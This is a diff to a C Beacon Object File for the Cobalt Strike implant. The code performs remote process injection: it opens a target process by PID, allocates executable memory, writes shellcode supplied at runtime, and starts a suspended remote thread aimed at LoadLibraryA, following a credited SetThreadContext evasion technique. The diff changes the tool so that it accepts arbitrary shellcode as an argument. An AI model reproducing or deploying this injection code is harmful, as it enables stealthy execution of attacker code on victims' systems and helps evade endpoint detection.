@@ -1,5 +1,5 @@
 // Chris Sikes
-// 04/13/2021
+// Apr 2021
 // Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
 // Beacon Object file version
 #include <windows.h>
@@ -17,20 +17,24 @@ WINBASEAPI WINBOOL WINAPI KERNEL32$GetThreadContext (HANDLE hThread, LPCONTEXT l
 
 void go(char * argc, int len)
 {
-	unsigned char shellcode[] = "<insert shellcode here>";
+	char* shellcode;
+	SIZE_T shell_len;
+
 	datap	parser;
 	BeaconDataParse(&parser, argc, len);
 	DWORD pid = BeaconDataInt(&parser);
+	shell_len = BeaconDataLength(&parser);
+	shellcode = BeaconDataExtract(&parser, NULL);
 	char currentDir[MAX_PATH];
 	SIZE_T bytesWritten = 0;
 	HANDLE threadHandle;
 
 
 	HANDLE Process_Handle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sizeof shellcode, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, shell_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
 	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
-	KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, sizeof shellcode, NULL);
+	KERNEL32$WriteProcessMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
 	threadHandle = KERNEL32$CreateRemoteThread(Process_Handle, NULL, 0, (LPTHREAD_START_ROUTINE)_loadLibrary, NULL, CREATE_SUSPENDED, NULL);
 	CONTEXT ctx;
 
